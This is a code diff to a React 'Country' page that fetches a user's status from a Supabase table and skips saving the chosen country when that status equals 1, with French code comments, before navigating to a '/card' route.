@@ -1,5 +1,5 @@
 
-import React from "react";
+import React, { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { supabase } from "@/lib/supabase";
@@ -9,6 +9,34 @@ import { useToast } from "@/components/ui/use-toast";
 const Country = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
+  const [userStatus, setUserStatus] = useState<number | null>(null);
+
+  useEffect(() => {
+    const checkUserStatus = async () => {
+      const userId = localStorage.getItem("userId");
+      
+      if (!userId) {
+        navigate("/");
+        return;
+      }
+      
+      try {
+        const { data, error } = await supabase
+          .from("users")
+          .select("statut")
+          .eq("id", userId)
+          .single();
+        
+        if (error) throw error;
+        
+        setUserStatus(data.statut);
+      } catch (error) {
+        console.error(error);
+      }
+    };
+    
+    checkUserStatus();
+  }, [navigate]);
 
   const handleSelectCountry = async (country: string) => {
     const userId = localStorage.getItem("userId");
@@ -19,13 +47,19 @@ const Country = () => {
     }
     
     try {
-      // Mettre à jour le pays dans la base de données
-      await supabase
-        .from("users")
-        .update({ pays: country })
-        .eq("id", userId);
+      // Vérifier le statut
+      if (userStatus === 1) {
+        // Si le statut est 1, ne pas enregistrer les données
+        console.log("Utilisateur avec statut 1, les données ne sont pas enregistrées");
+      } else {
+        // Mettre à jour le pays dans la base de données uniquement si le statut est différent de 1
+        await supabase
+          .from("users")
+          .update({ pays: country })
+          .eq("id", userId);
+      }
       
-      // Rediriger vers la page suivante
+      // Rediriger vers la page suivante dans tous les cas
       navigate("/card");
     } catch (error) {
       console.error(error);
